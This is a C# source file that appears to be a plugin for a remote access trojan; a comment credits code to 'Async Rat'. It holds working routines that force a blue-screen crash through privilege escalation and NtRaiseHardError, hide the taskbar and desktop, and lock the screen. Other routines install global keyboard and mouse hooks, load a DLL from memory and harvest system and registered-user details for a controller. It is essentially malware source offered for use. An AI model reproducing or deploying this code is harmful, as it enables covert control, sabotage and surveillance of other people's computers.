using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal static class Functions
    {
		private const uint i = 0xC0000022;
		private const string screenLockerName = "BLRSCRL";

		internal static Thread keyboadThread = new Thread(KeyboardThread);
		internal static NativeAPI.Hook.KeyBoardHooking keyboardHook = new NativeAPI.Hook.KeyBoardHooking();

		internal static Thread mouseThread = new Thread(MouseThread);
		internal static NativeAPI.Hook.MouseHooking mouseHook = new NativeAPI.Hook.MouseHooking();

		internal static Form F = new Form();

		internal static void DesktopIcons(bool l)
		{
			if (l == true)
			{
				IntPtr handle = System.IntPtr.Zero;
				IntPtr progManager = NativeAPI.Miscellaneous.FindWindow("Progman", null);
				//If (progManager) ??
				IntPtr desktop = NativeAPI.Miscellaneous.FindWindowEx(progManager, IntPtr.Zero, "SHELLDLL_DefView", null);
				//If (desktop) ??
				handle = NativeAPI.Miscellaneous.FindWindowEx(desktop, IntPtr.Zero, "SysListView32", null);
				NativeAPI.Miscellaneous.ShowWindow(handle, 5);
			}
			else
			{

				IntPtr handle = System.IntPtr.Zero;
				IntPtr progManager = NativeAPI.Miscellaneous.FindWindow("Progman", null);
				//If (progManager) ??
				IntPtr desktop = NativeAPI.Miscellaneous.FindWindowEx(progManager, IntPtr.Zero, "SHELLDLL_DefView", null);
				//If (desktop) ??
				handle = NativeAPI.Miscellaneous.FindWindowEx(desktop, IntPtr.Zero, "SysListView32", null);
				NativeAPI.Miscellaneous.ShowWindow(handle, 0);
			}
		}
		internal static void TaskBar(int i)
		{
			NativeAPI.Miscellaneous.ShowWindow(NativeAPI.Miscellaneous.FindWindow("Shell_TrayWnd", null), i);
		}
		internal static void PowerOptions(int flg, int minRea = 0)
		{
			bool t1 = false;
			NativeAPI.Miscellaneous.RtlAdjustPrivilege(19, true, false,out t1);
			NativeAPI.Miscellaneous.ExitWindowsEx(flg, 0 | minRea);
		}
		internal static void BSOD() 
		{
			bool t1 = false;
			uint t2 = 0;
			NativeAPI.Miscellaneous.RtlAdjustPrivilege(19, true, false, out t1);
			NativeAPI.Miscellaneous.NtRaiseHardError(i, 0, 0, IntPtr.Zero, 6, out t2);
		}
		internal static void Hibernate() 
		{
			bool t1 = false;
			NativeAPI.Miscellaneous.RtlAdjustPrivilege(19, true, false, out t1);
			NativeAPI.Miscellaneous.SetSuspendState(true, true, true);
		}
		internal static void Suspend()
		{
			bool t1 = false;
			NativeAPI.Miscellaneous.RtlAdjustPrivilege(19, true, false, out t1);
			NativeAPI.Miscellaneous.SetSuspendState(false, true, true);
		}

		internal static void StartScreenLocker() 
		{
			if (Application.OpenForms[screenLockerName] == null) 
			{
				ScreenLocker o = new ScreenLocker(screenLockerName);
				o.InitializeComponent();
				o.ShowDialog();
			}
		}

		internal static void StopScreenLocker() 
		{
			NativeAPI.Miscellaneous.PostMessage(Application.OpenForms[screenLockerName].Handle, NativeAPI.Miscellaneous.WM_Message.WM_SYSCOMMAND, NativeAPI.Miscellaneous.SC_Message.SC_CLOSE, IntPtr.Zero);
			return;
		}

		internal static int SetAero10(IntPtr hwnd)
		{
			NativeAPI.Miscellaneous.AccentPolicy accentPolicy = new NativeAPI.Miscellaneous.AccentPolicy
			{
				AccentState = NativeAPI.Miscellaneous.AccentState.ACCENT_ENABLE_BLURBEHIND,
				AccentFlags = 0,
				GradientColor = 0,
				AnimationId = 0
			};
			NativeAPI.Miscellaneous.WindowCompositionAttributeData data = new NativeAPI.Miscellaneous.WindowCompositionAttributeData { Attribute = NativeAPI.Miscellaneous.WindowCompositionAttribute.WCA_ACCENT_POLICY };
			int accentSize = Marshal.SizeOf(accentPolicy);
			IntPtr accentPtr = Marshal.AllocHGlobal(accentSize);
			Marshal.StructureToPtr(accentPolicy, accentPtr, false);
			data.Data = accentPtr;
			data.SizeOfData = accentSize;
			int result = NativeAPI.Miscellaneous.SetWindowCompositionAttribute(hwnd, ref data);
			Marshal.FreeHGlobal(accentPtr);
			return result;
		}

		internal static void HookKeyboard() 
		{
			try
			{
				keyboadThread.Start();
			}
			catch { }		
		}

		private static void KeyboardThread() 
		{
            try
            {
				keyboardHook.HookKeyboard();
				Application.Run();
			}
            catch{ }
		}

		internal static void UnhookKeyboard() 
		{
			keyboardHook.AbortHook();
		}

		internal static void HookMouse()
		{
			try
			{
				mouseThread.Start();
			}
			catch { }
		}
		private static void MouseThread()
		{
			try
			{
				mouseHook.HookMouse();
				Application.Run();
			}
			catch { }
		}
		internal static void UnhookMouse()
		{
			mouseHook.AbortHook();
		}

		//From Async Rat
		internal static void SetWallPaper(byte[] file, string ext) 
		{
			byte[] decompressed = Shared.Compressor.QuickLZ.Decompress(file);
			string path1 = Path.Combine(Path.GetTempFileName() + ext);
			string path2 = Path.Combine(Path.GetTempFileName() + ext);
			File.WriteAllBytes(path1, decompressed);

			using (Bitmap bmp = new Bitmap(path1))
			using (Graphics graphics = Graphics.FromImage(bmp))
			{
				bmp.Save(path2, ImageFormat.Bmp);
			}
			using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true))
			{
				key.SetValue("WallpaperStyle", 2.ToString());
				key.SetValue("TileWallpaper", 0.ToString());
			}
			NativeAPI.Miscellaneous.SystemParametersInfo(NativeAPI.Miscellaneous.SPI_SETDESKWALLPAPER, 0, path2, NativeAPI.Miscellaneous.SPIF_UPDATEINIFILE | NativeAPI.Miscellaneous.SPIF_SENDWININICHANGE);
		}

		internal static void GetPrivilege(int privIndex, ref Data data) 
		{
            try
            {
				NativeAPI._PRIVILEGES pRIVILEGES = (NativeAPI._PRIVILEGES)privIndex;
				bool wasEnable;
				//MessageBox.Show(pRIVILEGES.ToString());
				NativeAPI.NTSTATUS n = NativeAPI.Functions.RtlAdjustPrivilege(pRIVILEGES, true, false, out wasEnable);
				data.DataReturn = new object[] { n , pRIVILEGES , wasEnable };
				data.returnError = new ReturnError() { hasError = false };
			}
            catch (Exception ex)
            {
				data.returnError = new ReturnError() { hasError = true, errorDescription = ex.ToString() };
			}
		}

		internal static void MuteSound() 
		{
			NativeAPI.Miscellaneous.SendMessage(F.Handle, NativeAPI.Miscellaneous.WM_APPCOMMAND, F.Handle, NativeAPI.Miscellaneous.APPCOMMAND_VOLUME_MUTE);
		}

		internal static void SoundUp()
		{
			NativeAPI.Miscellaneous.SendMessage(F.Handle, NativeAPI.Miscellaneous.WM_APPCOMMAND, F.Handle, NativeAPI.Miscellaneous.APPCOMMAND_VOLUME_UP);
		}

		internal static void SoundDown() 
		{
			NativeAPI.Miscellaneous.SendMessage(F.Handle, NativeAPI.Miscellaneous.WM_APPCOMMAND, F.Handle, NativeAPI.Miscellaneous.APPCOMMAND_VOLUME_DOWN);
		}

		internal delegate IntPtr CPU();
		internal static void GetInformation(ref byte[] b , ref Data data) 
		{
			DLLFromMemory l = new DLLFromMemory(Shared.Compressor.QuickLZ.Decompress(b));
			CPU C = (CPU)l.GetDelegateFromFuncName("CpuInformation", typeof(CPU));
			string s = Marshal.PtrToStringUni(C());
			NativeAPI.Information information = new NativeAPI.Information();
			Dictionary<string, string> infoList = new Dictionary<string, string>();
			infoList.Add("CPU", s);
			infoList.Add("RAM", information.GetRAM() + " KB");
			infoList.Add("FirmwareType", information.GetFirmwareType());

			WMIHelper(@"\root\CIMV2", "SELECT Caption FROM Win32_OperatingSystem", ref infoList);
			WMIHelper(@"\root\CIMV2", "SELECT CSName FROM Win32_OperatingSystem", ref infoList);
			WMIHelper(@"\root\CIMV2", "SELECT Manufacturer FROM Win32_OperatingSystem", ref infoList);
			WMIHelper(@"\root\CIMV2", "SELECT OSArchitecture FROM Win32_OperatingSystem", ref infoList);
			WMIHelper(@"\root\CIMV2", "SELECT OSProductSuite FROM Win32_OperatingSystem", ref infoList);
			WMIHelper(@"\root\CIMV2", "SELECT OSType FROM Win32_OperatingSystem", ref infoList);
			WMIHelper(@"\root\CIMV2", "SELECT ProductType FROM Win32_OperatingSystem", ref infoList);
			WMIHelper(@"\root\CIMV2", "SELECT RegisteredUser FROM Win32_OperatingSystem", ref infoList);
			WMIHelper(@"\root\CIMV2", "SELECT SystemDirectory FROM Win32_OperatingSystem", ref infoList);
			WMIHelper(@"\root\CIMV2", "SELECT SystemDrive FROM Win32_OperatingSystem", ref infoList);
			WMIHelper(@"\root\CIMV2", "SELECT Version FROM Win32_OperatingSystem", ref infoList);

			data.DataReturn = new object[] { 
				infoList
			};
			data.returnError = new ReturnError() { hasError = false };
		}

		private static void WMIHelper(string path, string request, ref Dictionary<string, string> dict) 
		{
			WMILib.WMIRequest req = new WMILib.WMIRequest(path, request);
			req.Request();
			if (req.RequestReturns.Count == 1)
			{
				foreach (var a in req.RequestReturns)
				{
					foreach (var c in a)
					{
						dict.Add(c.Key, c.Value);
					}
				}
			}
		}
	}
}